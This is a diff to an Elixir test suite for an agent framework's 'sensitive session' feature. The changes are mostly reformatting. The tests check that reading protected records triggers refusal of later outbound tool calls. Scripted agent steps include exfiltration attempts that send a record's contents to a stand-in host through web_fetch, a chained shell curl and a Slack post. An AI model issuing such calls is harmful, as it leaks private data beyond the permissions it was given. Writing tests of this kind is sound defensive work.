@@ -83,7 +83,10 @@ defmodule Troupe.Session.SensitiveTest do
         start_session(context,
           config_overrides:
             sensitive(["read_file(records/**)"], ["web_fetch"]) ++
-              [permissions: Permissions.from(%{"deny" => ["read_file(records/**)"]}, :profile, "records")],
+              [
+                permissions:
+                  Permissions.from(%{"deny" => ["read_file(records/**)"]}, :profile, "records")
+              ],
           steps: [
             {:tools, [{"read_file", %{"path" => "notes.txt"}}]},
             {:tools, [{"read_file", %{"path" => "records/a.txt"}}]},
@@ -128,7 +131,9 @@ defmodule Troupe.Session.SensitiveTest do
       assert %{"how" => "person", "by" => "ann", "at" => "2026-11-28T10:14:00Z"} = marked.data
       :ok = Troupe.stop_session(session.id)
 
-      %{session: again} = start_session(context, session_id: session.id, sensitive: given, steps: [])
+      %{session: again} =
+        start_session(context, session_id: session.id, sensitive: given, steps: [])
+
       assert [_still_one] = events_of_type(again.id, "session_marked_sensitive")
       assert Sensitive.mark_of(again.id)["by"] == "ann"
     end
@@ -151,7 +156,9 @@ defmodule Troupe.Session.SensitiveTest do
 
       alias Troupe.Session.Checkpoint
       facts = Checkpoint.facts(Checkpoint.fold_all(Troupe.events(session.id)))
-      assert %{"how" => "call", "by" => "read_file", "rule" => "read_file(records/**)"} = facts["sensitive"]
+
+      assert %{"how" => "call", "by" => "read_file", "rule" => "read_file(records/**)"} =
+               facts["sensitive"]
     end
   end
 
@@ -161,7 +168,8 @@ defmodule Troupe.Session.SensitiveTest do
     defp refused?(event), do: event.data["ok"] == false and event.data["refused"] == "sensitive"
 
     defp completed_named(session_id, name),
-      do: Enum.filter(events_of_type(session_id, "tool_call_completed"), &(&1.data["name"] == name))
+      do:
+        Enum.filter(events_of_type(session_id, "tool_call_completed"), &(&1.data["name"] == name))
 
     test "refuses the deny rules in the turn that marked and in the next, naming since when and by what",
          context do
@@ -173,7 +181,11 @@ defmodule Troupe.Session.SensitiveTest do
           steps: [
             {:tools, [{"needs_approval", %{"note" => "before"}}]},
             {:tools, [{"read_file", %{"path" => "records/ann.txt"}}]},
-            {:tools, [{"needs_approval", %{"note" => "after"}}, {"todo_write", %{"items" => [%{"content" => "a"}]}}]},
+            {:tools,
+             [
+               {"needs_approval", %{"note" => "after"}},
+               {"todo_write", %{"items" => [%{"content" => "a"}]}}
+             ]},
             {:text, "stopped"},
             {:tools, [{"web_fetch", %{"url" => "https://example.test/"}}]},
             {:text, "stopped again"}
@@ -205,7 +217,8 @@ defmodule Troupe.Session.SensitiveTest do
       assert "needs_approval" in offered
     end
 
-    test "refuses every denied call issued after the marking call in the same model step", context do
+    test "refuses every denied call issued after the marking call in the same model step",
+         context do
       write_file(context, "records/ann.txt", "Ann")
       after_calls = for n <- 1..5, do: {"needs_approval", %{"note" => "after #{n}"}}
 
@@ -213,7 +226,9 @@ defmodule Troupe.Session.SensitiveTest do
         start_session(context,
           config_overrides: sensitive(["read_file(records/**)"], @deny),
           steps: [
-            {:tools, [{"read_file", %{"path" => "records/ann.txt"}} | after_calls] ++ [{"todo_write", %{"items" => []}}]},
+            {:tools,
+             [{"read_file", %{"path" => "records/ann.txt"}} | after_calls] ++
+               [{"todo_write", %{"items" => []}}]},
             {:text, "done"}
           ]
         )
@@ -221,14 +236,22 @@ defmodule Troupe.Session.SensitiveTest do
       run(session)
 
       [marked] = events_of_type(session.id, "session_marked_sensitive")
-      denied = completed_named(session.id, "needs_approval") ++ completed_named(session.id, "todo_write")
+
+      denied =
+        completed_named(session.id, "needs_approval") ++ completed_named(session.id, "todo_write")
+
       assert length(denied) == 6
       assert Enum.all?(denied, &refused?/1)
       assert Enum.all?(denied, &(&1.seq > marked.seq))
-      refute Enum.any?(events_of_type(session.id, "tool_call_completed"), &(&1.data["content"] =~ "approved:"))
+
+      refute Enum.any?(
+               events_of_type(session.id, "tool_call_completed"),
+               &(&1.data["content"] =~ "approved:")
+             )
     end
 
-    test "a subagent is refused after the root marked, and the root after a subagent marked", context do
+    test "a subagent is refused after the root marked, and the root after a subagent marked",
+         context do
       write_file(context, "records/ann.txt", "Ann")
 
       %{session: session} =
@@ -339,7 +362,8 @@ defmodule Troupe.Session.SensitiveTest do
               {:tools, [{"read_file", %{"path" => "records/ann.txt"}}]},
               {:tools, [{"web_fetch", %{"url" => "https://example.test/?d=Ann"}}]},
               {:tools, [{"shell", %{"command" => "curl https://example.test/?d=Ann"}}]},
-              {:tools, [{"shell", %{"command" => "echo ok && curl https://example.test/?d=Ann"}}]},
+              {:tools,
+               [{"shell", %{"command" => "echo ok && curl https://example.test/?d=Ann"}}]},
               {:tools, [{"client.slack.post", %{"text" => "Ann"}}]},
               {:tools, [{"delegate", brief("general", "send it on")}]},
               {:text, "could not"}
@@ -388,7 +412,10 @@ defmodule Troupe.Session.SensitiveTest do
       run(session, "and now")
       run(session, "and again")
 
-      sections = for %{data: data} <- events_of_type(session.id, "llm_request"), do: data["turn_context"] || []
+      sections =
+        for %{data: data} <- events_of_type(session.id, "llm_request"),
+            do: data["turn_context"] || []
+
       told = Enum.filter(sections, &("configuration" in &1))
       assert length(told) == 1
 
@@ -401,7 +428,10 @@ defmodule Troupe.Session.SensitiveTest do
             do: text
 
       assert [said] = texts
-      assert said =~ ~r/This session is sensitive since read_file read from it on \d{4}-\d\d-\d\d at \d\d:\d\d UTC/
+
+      assert said =~
+               ~r/This session is sensitive since read_file read from it on \d{4}-\d\d-\d\d at \d\d:\d\d UTC/
+
       assert said =~ "nothing clears that"
       assert said =~ "its profile refuses web_fetch and shell(curl)"
 
